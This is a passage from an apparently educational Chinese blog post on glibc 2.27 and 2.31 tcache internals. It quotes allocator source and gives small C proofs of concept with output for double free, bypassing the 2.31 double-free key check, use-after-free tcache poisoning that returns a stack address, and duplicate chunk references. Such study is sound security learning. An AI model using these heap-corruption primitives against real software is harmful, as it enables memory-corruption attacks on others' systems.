fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>



<p>并且调试观察当<code>chunk2 = malloc(0x10);</code>之后<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>接着当<code>chunk3 = malloc(0x10);</code>之后,<code>tcache-&gt;count[tc_idx] = 255 </code>,发生了整数下溢</p>
<p>只能说<code>glibc-2.27</code>上的<code>tcache</code>是很简陋的</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//放回堆块到tcache时根据counts决定对应桶是否已经存满</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>tcache-&gt;counts[tc_idx]</code>终于发挥作用了,原来是不想遍历链表统计堆块个数,直接看<code>counts</code>偷懒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>free</code>时根本没有检查, 甚至名目仗胆的<code>double free</code>都没事, 写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//就是明目张胆double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>



<h3 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h3><h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//如果key等于glibc既定key值说明本堆块是已经被释放的</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>glibc-2.29</code>之后, <code>tcache_entry</code>结构中加入了一个key字段, 当使用<code>tcache_put</code>把堆块挂到<code>tcache</code>中时, 其<code>key</code>字段均被设置为<code>tcache</code>的地址</p>
<p>以<code>glibc-2.31</code>为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//通过counts检查是否有剩余堆块,而不是通过链表是否指向空</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>与glibc-2.27中区别的一点是, 2.31中判断idx对应桶子中是否有堆块, 依据是<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,  不再看<code>entries</code>是否为空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到tcache堆块不会有对齐检查</p>
<p>堆块从tcache中拿出来之前会将key归零, 防止泄露tcache地址</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//如果检查到e-&gt;key == tcache, 说明可能存在double free ,因为自然情况下堆块中的数据等于tcache地址概率太小了</span></span><br><span class="line">                <span class="comment">//为了避免误杀, 下面还是要再次确定一下, tcache相关桶子里是否真的有这个堆块</span></span><br><span class="line">                <span class="comment">//如果真有则说明真的double free了</span></span><br><span class="line">                <span class="comment">//也就是说e-&gt;key == tcache 是这个诊断流程的导火索</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//从头往后遍历判断已有的堆块是不是当前要插入的堆块</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//根据counts判断是否已经装满</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>相比于<code>glibc-2.27</code>, 加入了放回堆块前的<code>double free</code>检查, 但是该检查很容易绕过</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//假设溢出修改chunkmem, 以绕过对key的检查</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>

<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>glibc2.31中的利用手段,基本上都是针对next指针没有约束, 攻击者可以随便修改之</p>
<h4 id="Use-After-Free-导致-tcache-entry-poisoning"><a href="#Use-After-Free-导致-tcache-entry-poisoning" class="headerlink" title="Use After Free 导致 tcache entry poisoning"></a>Use After Free 导致 tcache entry poisoning</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>



<h4 id="Double-Free造成重复引用"><a href="#Double-Free造成重复引用" class="headerlink" title="Double Free造成重复引用"></a>Double Free造成重复引用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//把key扬了</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>



<h4 id="tcache-overflow-导致-tcache-entry-poisoning"><a href="#tcache-overflow-导致-tcache-entry-poisoning" class="headerlink" title="tcache overflow 导致 tcache entry poisoning"></a>tcache overflow 导致 tcache entry poisoning</h4><p>可以利用堆溢出造成任意地址读写</p>
